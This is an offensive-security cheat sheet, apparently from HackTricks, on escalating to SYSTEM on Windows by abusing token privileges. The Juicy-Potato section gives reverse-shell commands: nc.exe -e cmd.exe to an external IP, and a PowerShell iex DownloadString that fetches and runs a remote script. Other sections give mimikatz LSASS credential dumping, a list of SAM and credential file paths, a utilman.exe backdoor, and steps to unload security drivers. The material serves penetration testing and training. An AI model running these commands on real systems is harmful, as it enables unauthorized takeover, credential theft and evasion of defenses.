# Abusing Tokens

## Theory

Each user logged onto the system holds an access token with security information for that logon session. The system creates an access token when the user logs on. Every process executed on behalf of the user has a copy of the access token. The token identifies the user, the user's groups, and the user's privileges. A token also contains a logon SID (Security Identifier) that identifies the current logon session.

You can see this information executing `whoami /all`

### Types of tokens

There are two types of tokens available:

* **Primary token**: Primary tokens can only be **associated to processes**, and they represent a process's security subject. The creation of primary tokens and their association to processes are both privileged operations, requiring two different privileges in the name of privilege separation - the typical scenario sees the authentication service creating the token, and a logon service associating it to the user's operating system shell. Processes initially inherit a copy of the parent process's primary token.
*   **Impersonation token**: Impersonation is a security concept implemented in Windows NT that **allows** a server application to **temporarily** "**be**" **the client** in terms of access to secure objects. Impersonation has **four possible levels**:

    * **anonymous**, giving the server the access of an anonymous/unidentified user
    * **identification**, letting the server inspect the client's identity but not use that identity to access objects
    * **impersonation**, letting the server act on behalf of the client
    * **delegation**, same as impersonation but extended to remote systems to which the server connects (through the preservation of credentials).

    The client can choose the maximum impersonation level (if any) available to the server as a connection parameter. Delegation and impersonation are privileged operations (impersonation initially was not, but historical carelessness in the implementation of client APIs failing to restrict the default level to "identification", letting an unprivileged server impersonate an unwilling privileged client, called for it). **Impersonation tokens can only be associated to threads**, and they represent a client process's security subject. Impersonation tokens are usually created and associated to the current thread implicitly, by IPC mechanisms such as DCE RPC, DDE and named pipes.

## Practice
### Check privileges

```
whoami /priv
```

The **tokens that appear as Disabled** can be enable, you you actually can abuse _Enabled_ and _Disabled_ tokens.

### Enable All the tokens

You can use the script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) to enable all the tokens:

```powershell
.\EnableAllTokenPrivs.ps1
whoami /priv
```

### SeImpersonatePrivilege

Any process holding this privilege can **impersonate** (but not create) any **token** for which it is able to gethandle. You can get a **privileged token** from a **Windows service** (DCOM) making it perform an **NTLM authentication** against the exploit, then execute a process as **SYSTEM**. Exploit it with [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM ](https://github.com/antonioCoco/RogueWinRM)(needs winrm disabled), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

{% tabs %}
{% tab title="Juicy-Potato" %}
[JuicyPotato](https://github.com/ohpe/juicy-potato), a sugared version of RottenPotatoNG. It leverages several COM servers identified by this [list of CLSID](http://ohpe.it/juicy-potato/CLSID/)
{% hint style="danger" %}
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer),[RoguePotato](https://github.com/antonioCoco/RoguePotato), [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM
{% endhint %}
```bash
#nc.exe reverse shell
c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

#Powershell reverse shell
c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```  
{% endtab %}

{% tab title="GodPotato" %}
Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions. - [GodPotato](https://github.com/BeichenDream/GodPotato)

```bash
GodPotato -cmd "cmd /c whoami"
```

{% endtab %}
{% endtabs %}

### SeAssignPrimaryPrivilege

It is very similar to **SeImpersonatePrivilege**, it will use the **same method** to get a privileged token.\
Then, this privilege allows **to assign a primary token** to a new/suspended process. With the privileged impersonation token you can derivate a primary token (DuplicateTokenEx).\
With the token, you can create a **new process** with 'CreateProcessAsUser' or create a process suspended and **set the token** (in general, you cannot modify the primary token of a running process).


### SeTcbPrivilege

If you have enabled this token you can use **KERB\_S4U\_LOGON** to get an **impersonation token** for any other user without knowing the credentials, **add an arbitrary group** (admins) to the token, set the **integrity level** of the token to "**medium**", and assign this token to the **current thread** (SetThreadToken).

### SeBackupPrivilege 

This privilege causes the system to **grant all read access** control to any file (only read).\
Use it to **read the password hashes of local Administrator** accounts from the registry and then use "**psexec**" or "**wmicexec**" with the hash (PTH).\
This attack won't work if the Local Administrator is disabled, or if it is configured that a Local Admin isn't admin if he is connected remotely.\
You can **abuse this privilege** with:

* [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
* [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
* following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab\_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab\_channel=IppSec)

### SeRestorePrivilege

**Write access** control to any file on the system, regardless of the files ACL.\
You can **modify services**, DLL Hijacking, set **debugger** (Image File Execution Options)… A lot of options to escalate.

### SeCreateTokenPrivilege

This token **can be used** as EoP method **only** if the user **can impersonate** tokens (even without SeImpersonatePrivilege).\
In a possible scenario, a user can impersonate the token if it is for the same user and the integrity level is less or equal to the current process integrity level.\
In this case, the user could **create an impersonation token** and add to it a privileged group SID.

### SeLoadDriverPrivilege

**Load and unload device drivers.**\
You need to create an entry in the registry with values for ImagePath and Type.\
As you don't have access to write to HKLM, you have to **use HKCU**. But HKCU doesn't mean anything for the kernel, the way to guide the kernel here and use the expected path for a driver config is to use the path: "\Registry\User\S-1-5-21-582075628-3447520101-2530640108-1003\System\CurrentControlSet\Services\DriverName" (the ID is the **RID** of the current user).\
So, you have to **create all that path inside HKCU and set the ImagePath** (path to the binary that is going to be executed) **and Type** (SERVICE\_KERNEL\_DRIVER 0x00000001).\

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege" %}

### SeTakeOwnershipPrivilege

This privilege is very similar to **SeRestorePrivilege**.\
It allows a process to “**take ownership of an object** without being granted discretionary access” by granting the WRITE\_OWNER access right.\
First, you have to **take ownership of the registry key** that you are going to write on and **modify the DACL** so you can write on it.

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

It allows the holder to **debug another process**, this includes reading and **writing** to that **process' memory.**\
There are a lot of various **memory injection** strategies that can be used with this privilege that evade a majority of AV/HIPS solutions.

#### Dump memory

One example of **abuse of this privilege** is to run [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) to **dump a process memory**. For example, the **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local\_Security\_Authority\_Subsystem\_Service)**)** process, which stores user credentials after a user logs on to a system.

You can then load this dump in mimikatz to obtain passwords:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

#### RCE

If you want to get a `NT SYSTEM` shell you could use:

* ****[**SeDebugPrivilegePoC**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)****
* ****[**psgetsys.ps1**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)****

```powershell
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.\\

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte\_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                        |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Read sensitve files with `robocopy /b`                                                                                                                                                                                                                                                                                                             | <p>- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br><br>- <code>SeBackupPrivilege</code> (and robocopy) is not helpful when it comes to open files.<br><br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter.</p>                                                                      |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate the `lsass.exe` token.                                                                                                                                                                                                                                                                                                                   | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)                                                                                                                                                                                                         |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load buggy kernel driver such as <code>szkg64.sys</code><br>2. Exploit the driver vulnerability<br><br>Alternatively, the privilege may be used to unload security-related drivers with <code>ftlMC</code> builtin command. i.e.: <code>fltMC sysmondrv</code></p>                                                                           | <p>1. The <code>szkg64</code> vulnerability is listed as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732">CVE-2018-15732</a><br>2. The <code>szkg64</code> <a href="https://www.greyhathacker.net/?p=1025">exploit code</a> was created by <a href="https://twitter.com/parvezghh">Parvez Anwar</a></p> |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U</p> | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icalcs.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U</p>                                                                                                                                       | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens to have local admin rights included. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Reference

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" %}